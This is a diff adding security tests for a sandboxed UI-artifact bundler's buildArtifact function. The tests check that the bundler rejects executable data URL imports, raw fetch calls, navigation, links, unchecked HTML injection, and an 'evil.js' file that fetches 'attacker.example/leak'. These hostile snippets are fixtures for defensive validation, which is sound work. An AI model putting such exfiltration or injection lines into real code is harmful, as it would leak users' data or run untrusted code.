@@ -43,14 +43,27 @@ describe('buildArtifact', () => {
     expect(bundle).toContain("source: 'dsh-genui'")
     expect(bundle).toContain("type: 'ready'")
     expect(bundle).toContain("type === 'ready-request'")
+    expect(bundle).toContain('globalThis.__dshGenuiReady) postGenuiReady()')
+    expect(bundle).toContain('root.childNodes.length === 0')
     expect(bundle).toContain("type: 'runtime-error'")
-    expect(bundle).toContain('inFlightRequests')
+    expect(bundle).toContain("'interactive' : 'startup'")
+    expect(bundle).toContain("'data-ds-light-theme'")
+    expect(bundle).toContain('stateWriteQueues')
+    expect(bundle).toContain('__dshGenuiBridge')
+    expect(bundle).not.toContain('GenUI capability token is missing')
+    expect(bundle).not.toContain("authorization: 'Bearer '")
   }, 15_000)
 
   it('rejects imports outside the artifact allowlist', async () => {
     const result = await buildArtifact(version(`import fs from 'node:fs'; console.log(fs)`), await dist())
     expect(result.ok).toBe(false)
     expect(result.diagnostics.map(item => item.text).join('\n')).toContain('not allowed')
+  })
+
+  it('rejects executable data URL imports', async () => {
+    const result = await buildArtifact(version(`import 'data:text/javascript,globalThis.compromised%3Dtrue'`), await dist())
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text).join('\n')).toContain('Data URL imports are not allowed')
   })
 
   it('returns parse diagnostics instead of throwing', async () => {
@@ -85,5 +98,49 @@ describe('buildArtifact', () => {
       createRoot(document.getElementById('root')!).render(<App />)
     `), await dist())
     expect(result.ok).toBe(true)
+  })
+
+  it.each([
+    {
+      name: 'raw fetch',
+      source: `fetch('https://example.com/private')`,
+      diagnostic: 'raw browser networking APIs',
+    },
+    {
+      name: 'direct navigation',
+      source: `window.location.href = 'https://example.com/leak'`,
+      diagnostic: 'cannot navigate browsing contexts',
+    },
+    {
+      name: 'navigable markup',
+      source: `const link = <a href="https://example.com/leak">Leave</a>`,
+      diagnostic: 'cannot create navigable links',
+    },
+    {
+      name: 'unchecked HTML',
+      source: `const markup = { __html: '<p>unsafe</p>' }; const view = <main dangerouslySetInnerHTML={markup} />`,
+      diagnostic: 'cannot inject unchecked HTML',
+    },
+  ])('rejects $name outside the SDK boundary', async ({ source, diagnostic }) => {
+    const result = await buildArtifact(version(`
+      import React from 'react'
+      import { createRoot } from 'react-dom/client'
+      ${source}
+      function App() { return <main>Blocked source</main> }
+      createRoot(document.getElementById('root')!).render(<App />)
+    `), await dist())
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text).join('\n')).toContain(diagnostic)
+  })
+
+  it('applies the sandbox source contract to executable files outside src', async () => {
+    const result = await buildArtifact(version(
+      `import '../public/evil.js'; import React from 'react'; import { createRoot } from 'react-dom/client'; createRoot(document.getElementById('root')!).render(<main>Blocked import</main>)`,
+      [{ path: 'public/evil.js', content: `fetch('https://attacker.example/leak')` }],
+    ), await dist())
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics).toEqual(expect.arrayContaining([
+      expect.objectContaining({ file: 'public/evil.js', text: expect.stringContaining('raw browser networking APIs') }),
+    ]))
   })
 })
